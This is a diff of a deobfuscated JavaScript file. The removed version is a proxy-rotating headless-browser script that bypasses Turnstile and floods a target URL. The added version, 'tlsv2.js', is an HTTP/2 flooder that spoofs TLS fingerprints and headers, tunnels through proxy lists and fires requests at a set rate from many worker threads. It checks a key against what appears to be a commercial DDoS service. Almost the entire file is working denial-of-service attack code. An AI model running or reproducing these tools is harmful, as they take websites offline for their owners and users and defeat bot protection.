@@ -1,169 +1,255 @@
-//Wed Jul 30 2025 02:42:53 GMT+0000 (Coordinated Universal Time)
+//Wed Jul 30 2025 06:52:01 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-const {
-    connect
-  } = require("puppeteer-real-browser"),
-  fs = require("fs"),
-  readProxies = _0x1220a3 => {
-    try {
-      const _0x4e999b = fs.readFileSync(_0x1220a3, "utf-8").split("\n").map(_0x2ced57 => _0x2ced57.trim()).filter(_0x5f3017 => _0x5f3017 !== "").map(_0x5064ec => ({
-        "proxy": _0x5064ec
-      }));
-      console.log("[+] Loaded " + _0x4e999b.length + " proxies");
-      return _0x4e999b;
-    } catch (_0x3ee188) {
-      console.error("[-] Failed to read proxy file: " + _0x3ee188.message);
-      return [];
-    }
-  },
-  launchBrowserWithProxy = async (_0x12b5e5, _0x31de5d, _0x22a9db = 30000) => {
-    const {
-      proxy: _0x31bd9f
-    } = _0x31de5d;
-    try {
-      const [_0x200500, _0x46f6a3] = _0x31bd9f.split(":");
-      if (!_0x200500 || !_0x46f6a3) throw new Error("Invalid proxy format, expected host:port");
-      const _0x15c616 = Date.now(),
-        {
-          browser: _0x334c92,
-          page: _0x3b4853
-        } = await Promise.race([connect({
-          "headless": false,
-          "args": ["--no-sandbox", "--disable-setuid-sandbox"],
-          "customConfig": {},
-          "turnstile": true,
-          "connectOption": {},
-          "disableXvfb": false,
-          "ignoreAllFlags": false,
-          "proxy": {
-            "host": _0x200500,
-            "port": _0x46f6a3.toString()
+const net = require("net");
+const http2 = require("http2");
+const tls = require("tls");
+const cluster = require("cluster");
+const url = require("url");
+const crypto = require("crypto");
+const fs = require("fs");
+const https = require("https");
+white = "[1;37m";
+grey = "[0;37m";
+purple = "[0;35m";
+red = "[1;31m";
+bs = "[1;38m";
+green = "[1;32m";
+yellow = "[1;33m";
+purple = "[0;35m";
+cyan = "[0;36m";
+Cafe = "[0;33m";
+fucsya = "[1;35m";
+blue = "[1;34m";
+jj = "[1;30m";
+transparent = "e[0m";
+defcol = "[0m";
+process.setMaxListeners(0);
+require("events").EventEmitter.defaultMaxListeners = 0;
+if (process.argv.length < 8) {
+  console.log(red + "[" + blue + "usage:" + red + "] - " + red + "node tlsv2.js key target time rate thread proxy.txt" + defcol);
+  process.exit();
+}
+const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");
+const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
+const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
+const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
+const secureProtocol = "TLS_client_method";
+const headers = {};
+const secureContextOptions = {
+  "ciphers": ciphers,
+  "sigalgs": sigalgs,
+  "honorCipherOrder": true,
+  "secureOptions": secureOptions,
+  "secureProtocol": secureProtocol
+};
+const secureContext = tls.createSecureContext(secureContextOptions);
+var userAgents = readLines("ua.txt");
+const args = {
+  "key": process.argv[2],
+  "target": process.argv[3],
+  "time": ~~process.argv[4],
+  "Rate": ~~process.argv[5],
+  "threads": ~~process.argv[6],
+  "proxyFile": process.argv[7]
+};
+var proxies = readLines(args.proxyFile);
+const parsedTarget = url.parse(args.target);
+if (cluster.isMaster) {
+  const apiKey = args.key;
+  const apiURL = "https://proxypool.us/script.php?key=" + apiKey + "&script=script";
+  https.get(apiURL, _0x5d7057 => {
+    let _0x373245 = "";
+    _0x5d7057.on("data", _0xb9539 => {
+      _0x373245 += _0xb9539;
+    });
+    _0x5d7057.on("end", () => {
+      {
+        const _0x5c000a = JSON.parse(_0x373245);
+        if (_0x5c000a.status === "error") {
+          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "API Error: " + red + ("" + _0x5c000a.message) + defcol);
+          process.exit(1);
+        } else {
+          const _0x27674d = readLines(args.proxyFile);
+          const _0x1d3f98 = _0x27674d.length;
+          console.log(red + "[" + jj + "TG By @ProxyPool_news" + red + "] - " + green + "TLSv2 script is running");
+          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Target: " + red + ("" + args.target));
+          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Time: " + green + ("" + args.time) + "s");
+          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Threads: " + green + ("" + args.threads));
+          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Proxy: " + blue + ("" + args.proxyFile));
+          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Proxy quantity: " + green + ("" + _0x1d3f98) + defcol);
+          for (let _0xdd39f8 = 1; _0xdd39f8 <= args.threads; _0xdd39f8++) {
+            cluster.fork();
           }
-        }), new Promise((_0x177711, _0x4215f2) => setTimeout(() => _0x4215f2(new Error("Browser launch timeout")), _0x22a9db))]);
-      await Promise.race([_0x3b4853.goto(_0x12b5e5, {
-        "waitUntil": "domcontentloaded"
-      }), new Promise((_0x425bd3, _0x34d70a) => setTimeout(() => _0x34d70a(new Error("Page load timeout")), _0x22a9db))]);
-      const _0x3c4591 = await _0x3b4853.title();
-      console.log("[+] Browser launched, proxy: " + _0x31bd9f + ", time: " + (Date.now() - _0x15c616) / 1000 + "s, title: " + _0x3c4591);
-      return {
-        "browser": _0x334c92,
-        "page": _0x3b4853,
-        "startTime": _0x15c616
-      };
-    } catch (_0x11f897) {
-      console.log("[-] Proxy " + _0x31bd9f + " failed: " + _0x11f897.message);
-      return null;
-    }
-  },
-  performRequests = async (_0x4e4d10, _0xd296d3, _0x513092, _0x5401c1, _0x1c2b65, _0x593dfd, _0x521219, _0x2ca245, _0x185408) => {
-    const _0x42ac5f = Date.now(),
-      _0x12b101 = 1000 / _0x513092;
-    while (Date.now() - _0x42ac5f < _0x5401c1 * 1000 && !_0x185408.stop) {
-      try {
-        {
-          if (_0x2ca245) {
-            const _0x362778 = await _0x4e4d10.evaluate(async _0x53fe25 => {
-              const _0x452e2a = await fetch(_0x53fe25, {
-                "method": "GET"
-              });
-              return {
-                "status": _0x452e2a.status,
-                "ok": _0x452e2a.ok
-              };
-            }, _0xd296d3);
-            _0x593dfd.totalRequests++;
-            _0x521219[_0x362778.status] = (_0x521219[_0x362778.status] || 0) + 1;
-          } else await _0x4e4d10.reload(), _0x593dfd.totalRequests++, _0x521219.reload = (_0x521219.reload || 0) + 1;
         }
-      } catch (_0x4b5f49) {
-        _0x521219.error = (_0x521219.error || 0) + 1;
       }
-      await new Promise(_0x268462 => setTimeout(_0x268462, _0x12b101));
+    });
+  }).on("error", _0xcbffed => {
+    console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "API Error: " + red + ("" + _0xcbffed.message) + defcol);
+    process.exit(1);
+  });
+} else {
+  setInterval(runFlooder);
+  setTimeout(() => {
+    process.exit(0);
+  }, args.time * 1000);
+}
+class NetSocket {
+  constructor() {}
+  ["HTTP"](_0x15d27b, _0x29802c) {
+    const _0x284165 = _0x15d27b.address.split(":");
+    const _0x166b22 = _0x284165[0];
+    const _0x410309 = "CONNECT " + _0x15d27b.address + ":443 HTTP/1.1\r\nHost: " + _0x15d27b.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+    const _0x2fa9c0 = new Buffer.from(_0x410309);
+    const _0x41ee3c = net.connect({
+      "host": _0x15d27b.host,
+      "port": _0x15d27b.port,
+      "allowHalfOpen": true,
+      "writable": true,
+      "readable": true
+    });
+    _0x41ee3c.setTimeout(_0x15d27b.timeout * 10000);
+    _0x41ee3c.setKeepAlive(true, 10000);
+    _0x41ee3c.setNoDelay(true);
+    _0x41ee3c.on("connect", () => {
+      _0x41ee3c.write(_0x2fa9c0);
+    });
+    _0x41ee3c.on("data", _0x1eb23f => {
+      const _0x394fb6 = _0x1eb23f.toString("utf-8");
+      const _0x124a14 = _0x394fb6.includes("HTTP/1.1 200");
+      if (_0x124a14 === false) {
+        _0x41ee3c.destroy();
+        return _0x29802c(undefined, "error: invalid response from proxy server");
+      }
+      return _0x29802c(_0x41ee3c, undefined);
+    });
+    _0x41ee3c.on("timeout", () => {
+      {
+        _0x41ee3c.destroy();
+        return _0x29802c(undefined, "error: timeout exceeded");
+      }
+    });
+    _0x41ee3c.on("error", _0x59e6b3 => {
+      {
+        _0x41ee3c.destroy();
+        return _0x29802c(undefined, "error: " + _0x59e6b3);
+      }
+    });
+  }
+}
+const Socker = new NetSocket();
+function readLines(_0x25f8c8) {
+  return fs.readFileSync(_0x25f8c8, "utf-8").toString().split(/\r?\n/);
+}
+function randomIntn(_0x39f7cc, _0x17bef8) {
+  return Math.floor(Math.random() * (_0x17bef8 - _0x39f7cc) + _0x39f7cc);
+}
+function randomElement(_0x2f639b) {
+  return _0x2f639b[randomIntn(0, _0x2f639b.length)];
+}
+function randomCharacters(_0x1d3a21) {
+  output = "";
+  for (let _0x1bb514 = 0; _0x1bb514 < _0x1d3a21; _0x1bb514++) {
+    {
+      output += randomElement(characters);
     }
-  },
-  startStatsLogger = (_0x50c940, _0x4fecad, _0x42a2fc, _0x2817a4 = 10000) => {
-    const _0x143546 = () => {
-      const _0x49d968 = Object.entries(_0x42a2fc).map(([_0x3d3f2e, _0x3e92e7]) => _0x3d3f2e + ":" + _0x3e92e7).join(",");
-      console.log("[*] Stats:\n  browsers      = " + _0x50c940.successfulBrowsers + ",\n  requests      = " + _0x50c940.totalRequests + ",\n  proxies_left  = " + _0x4fecad.length + ",\n  status_codes  = " + (_0x49d968 || "none"));
+  }
+  return output;
+}
+headers[":method"] = "GET";
+headers[":path"] = parsedTarget.path;
+headers[":scheme"] = "https";
+headers.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
+headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
+headers["accept-encoding"] = "gzip, deflate, br";
+headers["x-forwarded-proto"] = "https";
+headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
+headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
+headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
+headers["sec-fetch-dest"] = "document";
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-site"] = "same-origin";
+headers["upgrade-insecure-requests"] = "1";
+function runFlooder() {
+  const _0x38f7d6 = randomElement(proxies);
+  const _0x877872 = _0x38f7d6.split(":");
+  headers[":authority"] = parsedTarget.host;
+  headers["user-agent"] = randomElement(userAgents);
+  headers["x-forwarded-for"] = _0x877872[0];
+  const _0x5da10e = {
+    "host": _0x877872[0],
+    "port": ~~_0x877872[1],
+    "address": parsedTarget.host + ":443",
+    "timeout": 15
+  };
+  Socker.HTTP(_0x5da10e, (_0x400d6c, _0xd3ceae) => {
+    if (_0xd3ceae) return;
+    _0x400d6c.setKeepAlive(true, 60000);
+    _0x400d6c.setNoDelay(true);
+    const _0x5f43a2 = {
+      "enablePush": false,
+      "initialWindowSize": 1073741823
     };
-    return setInterval(_0x143546, _0x2817a4);
-  },
-  startTest = async (_0x28d711, _0x5036da, _0x30c66b, _0x2d3dfc, _0x581e4f, _0x46943e) => {
-    let _0x225055 = readProxies(_0x2d3dfc);
-    const _0x1e52a1 = [];
-    let _0x197a86 = 0;
-    const _0x433410 = {
-        "totalRequests": 0,
-        "successfulBrowsers": 0
-      },
-      _0x2b1428 = {},
-      _0x46dcec = {
-        "stop": false
-      },
-      _0x4ddb8f = startStatsLogger(_0x433410, _0x225055, _0x2b1428);
-    setTimeout(async () => {
-      _0x46dcec.stop = true;
-      clearInterval(_0x4ddb8f);
-      const _0x4e97d2 = Object.entries(_0x2b1428).map(([_0x34a73c, _0x176014]) => _0x34a73c + ":" + _0x176014).join(",");
-      for (const {
-        browser: _0x390fd9,
-        proxy: _0x3aadae
-      } of _0x1e52a1) {
-        try {
-          await _0x390fd9.close();
-          console.log("[+] Browser closed, proxy: " + _0x3aadae);
-        } catch (_0x30abbb) {
-          console.error("[-] Failed to close browser, proxy: " + _0x3aadae + ", error: " + _0x30abbb.message);
-        }
-      }
-      console.log("[+] Test completed");
-      process.exit(0);
-    }, _0x5036da * 1000);
-    const _0x2d0823 = [],
-      _0x4885ac = async () => {
-        while (_0x225055.length > 0 && _0x197a86 < _0x30c66b) {
-          if (_0x225055.length === 0) {
-            {
-              console.error("[-] Proxy pool exhausted, stopping new browser launches");
-              break;
-            }
+    const _0x26ba1f = {
+      "port": 443,
+      "secure": true,
+      "ALPNProtocols": ["h2"],
+      "ciphers": ciphers,
+      "sigalgs": sigalgs,
+      "requestCert": true,
+      "socket": _0x400d6c,
+      "ecdhCurve": ecdhCurve,
+      "honorCipherOrder": false,
+      "host": parsedTarget.host,
+      "rejectUnauthorized": false,
+      "clientCertEngine": "dynamic",
+      "secureOptions": secureOptions,
+      "secureContext": secureContext,
+      "servername": parsedTarget.host,
+      "secureProtocol": secureProtocol
+    };
+    const _0x5c2005 = tls.connect(443, parsedTarget.host, _0x26ba1f);
+    _0x5c2005.allowHalfOpen = true;
+    _0x5c2005.setNoDelay(true);
+    _0x5c2005.setKeepAlive(true, 60000);
+    _0x5c2005.setMaxListeners(0);
+    const _0x225427 = http2.connect(parsedTarget.href, {
+      "protocol": "https:",
+      "settings": _0x5f43a2,
+      "maxSessionMemory": 3333,
+      "maxDeflateDynamicTableSize": 4294967295,
+      "createConnection": () => _0x5c2005
+    });
+    _0x225427.setMaxListeners(0);
+    _0x225427.settings(_0x5f43a2);
+    _0x225427.on("connect", () => {
+      {
+        const _0x2be9db = setInterval(() => {
+          for (let _0x1a5560 = 0; _0x1a5560 < args.Rate; _0x1a5560++) {
+            headers.referer = "https://" + parsedTarget.host + parsedTarget.path;
+            const _0x538ca6 = _0x225427.request(headers).on("response", _0x560733 => {
+              _0x538ca6.close();
+              _0x538ca6.destroy();
+              return;
+            });
+            _0x538ca6.end();
           }
-          const _0x3ec5b0 = Math.floor(Math.random() * _0x225055.length),
-            _0x11fa06 = _0x225055[_0x3ec5b0];
-          _0x225055.splice(_0x3ec5b0, 1);
-          const _0x2288f9 = async () => {
-            {
-              const _0x1b721f = await launchBrowserWithProxy(_0x28d711, _0x11fa06);
-              if (_0x1b721f) {
-                _0x197a86++;
-                _0x433410.successfulBrowsers++;
-                const _0x228a4f = {
-                  ..._0x1b721f,
-                  "proxy": _0x11fa06.proxy
-                };
-                _0x1e52a1.push(_0x228a4f);
-                performRequests(_0x228a4f.page, _0x28d711, _0x581e4f, _0x5036da, _0x1e52a1.length, _0x433410, _0x2b1428, _0x46943e, _0x46dcec).catch(_0x364fa8 => console.error("[-] Browser " + _0x1e52a1.length + " attack failed: " + _0x364fa8.message));
-              }
-            }
-          };
-          _0x2d0823.push(_0x2288f9());
-          _0x2d0823.length >= _0x30c66b && (await Promise.all(_0x2d0823.splice(0, _0x30c66b)));
-        }
-        _0x2d0823.length > 0 && (await Promise.all(_0x2d0823));
-      };
-    _0x4885ac().catch(_0x2ec4ba => console.error("[-] Queue task failed: " + _0x2ec4ba.message));
-  },
-  printHelp = () => {
-    console.log("\n使用方法：\n  node script.js <目标URL> <持续时间(秒)> <线程数> <代理文件路径> <每线程请求速率> [--js | --reload]\n\n参数说明：\n  <目标URL>          要访问或请求的目标网址，例如：https://example.com\n  <持续时间>          测试持续的时间（单位：秒）\n  <线程数>            同时运行的浏览器数量\n  <代理文件路径>      包含代理的文本文件路径（每行格式为 host:port）\n  <每线程请求速率>    每个浏览器每秒发起的请求数\n  --js               使用 JavaScript fetch() 方式请求页面（默认方式）\n  --reload           使用刷新页面（reload）方式请求\n\n示例：\n  node script.js https://example.com 300 50 proxies.txt 10 --js\n");
-  },
-  args = process.argv.slice(2);
-(args.length < 5 || args.length > 6) && (printHelp(), process.exit(1));
-const url = args[0],
-  duration = parseInt(args[1]),
-  threads = parseInt(args[2]),
-  proxyFile = args[3],
-  rate = parseInt(args[4]),
-  useJs = args[5] === "--js" ? true : args[5] === "--reload" ? false : true;
-(!url || isNaN(duration) || isNaN(threads) || isNaN(rate) || !proxyFile) && (printHelp(), console.error("[-] Invalid arguments"), process.exit(1));
-startTest(url, duration, threads, proxyFile, rate, useJs);
+        }, 1000);
+      }
+    });
+    _0x225427.on("close", () => {
+      _0x225427.destroy();
+      _0x400d6c.destroy();
+      return;
+    });
+    _0x225427.on("error", _0xd3ceae => {
+      _0x225427.destroy();
+      _0x400d6c.destroy();
+      return;
+    });
+  });
+}
+process.on("uncaughtException", _0x19f1b2 => {});
+process.on("unhandledRejection", _0x21092f => {});
+_0xod7 = "jsjiami.com.v6";
